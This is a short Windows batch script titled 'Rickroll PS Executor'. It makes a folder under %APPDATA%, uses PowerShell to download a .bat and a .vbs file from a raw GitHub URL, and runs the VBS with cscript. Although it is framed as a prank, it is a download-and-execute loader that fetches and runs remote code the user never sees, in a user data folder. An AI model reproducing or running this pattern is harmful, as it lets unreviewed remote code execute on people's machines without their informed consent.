# Rickroll PS Executor

C:
mkdir %APPDATA%\rickroll_files
cd %APPDATA%\rickroll_files
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/suculent/shellistry/main/rickroll/main.bat -OutFile .\main.bat
powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/suculent/shellistry/main/rickroll/main.vbs -OutFile .\main.vbs
cscript.exe .\main.vbs